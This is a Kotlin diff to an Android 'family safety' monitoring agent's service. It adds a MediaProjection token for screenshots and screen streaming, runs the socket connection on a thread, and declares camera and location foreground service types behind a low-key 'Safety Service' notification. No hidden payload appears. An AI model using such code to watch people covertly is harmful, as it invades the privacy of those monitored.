@@ -3,6 +3,8 @@ package com.familysafety.agent
 import android.app.*
 import android.content.Context
 import android.content.Intent
+import android.content.pm.ServiceInfo
+import android.media.projection.MediaProjectionManager
 import android.os.Build
 import android.os.IBinder
 import androidx.core.app.NotificationCompat
@@ -14,19 +16,35 @@ class MainService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        startForegroundService()
-        SocketManager.connect(this)
+        startForegroundNotification()
+        Thread { SocketManager.connect(this) }.start()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d("MainService", "Service started")
+
+        // MediaProjection token'ı MainActivity'den al
+        val resultCode = intent?.getIntExtra("resultCode", -1) ?: -1
+        val projData   = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
+            intent?.getParcelableExtra("data", Intent::class.java)
+        else
+            @Suppress("DEPRECATION") intent?.getParcelableExtra("data")
+
+        if (resultCode != -1 && projData != null) {
+            val pm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+            val projection = pm.getMediaProjection(resultCode, projData)
+            ScreenshotHelper.setMediaProjection(projection)
+            ScreenStreamManager.setMediaProjection(projection)
+            Log.d("MainService", "MediaProjection alındı ve ayarlandı")
+        }
+
         return START_STICKY
     }
 
-    private fun startForegroundService() {
+    private fun startForegroundNotification() {
         val channelId = "family_safety_monitor"
         val channelName = "Safety Service"
-        
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val chan = NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_LOW)
             val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
@@ -42,7 +60,16 @@ class MainService : Service() {
             .setCategory(Notification.CATEGORY_SERVICE)
             .build()
 
-        startForeground(1, notification)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(
+                1, notification,
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION or
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
+            )
+        } else {
+            startForeground(1, notification)
+        }
     }
 
     override fun onDestroy() {
